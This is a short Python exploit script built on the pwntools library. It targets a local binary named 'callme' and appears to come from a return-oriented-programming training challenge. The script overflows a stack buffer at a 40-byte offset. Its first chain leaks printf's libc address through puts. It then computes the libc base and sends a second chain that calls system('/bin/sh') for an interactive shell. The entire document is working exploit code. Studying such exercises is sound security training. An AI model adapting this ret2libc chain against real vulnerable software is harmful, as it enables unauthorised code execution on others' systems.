from pwn import *

offset = 40

elf = context.binary = ELF('./callme')
libc = elf.libc
context.log_level = 'debug'

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

rop.raw(b'A' * offset)
rop.raw(pop_rdi)
rop.raw(elf.got.printf)
rop.raw(elf.plt.puts)
rop.raw(elf.sym.main)

p = process()

p.sendafter('>', rop.chain())
p.recvuntil('Thank you!\n')
printf_leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
log.info("printf, %#x", printf_leak)

libc.address = printf_leak - libc.sym.printf
log.info('libc, %#x', libc.address)

rop2 = ROP(libc)
# bin_sh = next(elf.search(b'/bin/sh'))

rop2.raw(b'A' * offset)
rop2.call(libc.sym.system, [b'/bin/sh'])

p.send(rop2.chain())
p.interactive()

